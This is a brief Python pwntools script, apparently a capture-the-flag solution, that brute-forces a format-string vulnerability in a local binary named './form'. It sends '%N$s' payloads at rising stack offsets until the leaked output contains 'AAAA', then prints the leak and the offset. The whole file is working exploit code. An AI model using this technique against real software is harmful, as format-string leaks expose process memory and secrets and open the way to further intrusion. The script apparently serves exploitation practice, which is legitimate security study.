from pwn import *

flag = b''

idx = 0
while b'AAAA' not in flag:
    idx += 1
    format_string = '%{}$s'.format(idx).encode('ascii')
    p = process(['./form'])
    p.sendline(format_string)
    flag = p.recvall()

print(flag)
print(idx)
